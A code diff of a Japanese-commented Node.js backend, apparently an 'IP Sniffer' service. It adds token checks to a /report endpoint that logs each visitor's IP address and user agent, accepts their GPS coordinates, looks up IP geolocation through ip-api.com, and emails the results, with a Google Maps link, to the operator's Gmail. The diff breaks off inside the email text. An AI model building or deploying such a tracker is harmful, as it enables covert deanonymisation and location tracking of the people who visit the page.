@@ -1,31 +1,48 @@
-// 完全無課金構成バージョンのNode.jsバックエンド
+// 完全統合版：VPN検出 + トークン認証 + 匿名保護付きNode.jsアプリ
+
 require('dotenv').config();
 const express = require('express');
+const crypto = require('crypto');
 const nodemailer = require('nodemailer');
 const uaParser = require('ua-parser-js');
 const fetch = require('node-fetch');
 const app = express();
 
-app.use(express.json());
 app.use(express.static('public'));
+app.use(express.json());
 
+const validTokens = new Set();
+
+// トークン発行API
+app.get('/token', (req, res) => {
+  const token = crypto.randomBytes(16).toString('hex');
+  validTokens.add(token);
+  setTimeout(() => validTokens.delete(token), 300000); // 5分後に無効化
+  res.json({ token });
+});
+
+// 通報API（トークン必須）
 app.post('/report', async (req, res) => {
+  const token = req.headers['authorization'];
+  if (!token || !validTokens.has(token)) {
+    return res.status(403).json({ error: '不正アクセス検出' });
+  }
+  validTokens.delete(token);
+
   const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const ip = rawIp.split(',')[0].trim();
   const ua = uaParser(req.headers['user-agent']);
   const { latitude, longitude } = req.body;
   const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-  // 無料APIを使ったIPジオ情報取得（精度は中程度）
   let geo = {};
   try {
     const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
     geo = await geoRes.json();
   } catch (err) {
-    console.error('IPジオAPIエラー:', err);
+    console.error('IPジオ情報取得エラー:', err);
   }
 
-  // Gmail送信用のトランスポーター
   const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -37,7 +54,7 @@ app.post('/report', async (req, res) => {
   const mailOptions = {
     from: `IP Sniffer <${process.env.GMAIL_USER}>`,
     to: process.env.GMAIL_USER,
-    subject: '📡 アクセス情報通知（無料構成）',
+    subject: '📡 アクセス情報通知（統合版）',
     text: `
 📡 アクセス情報：
 - IPアドレス: ${ip}
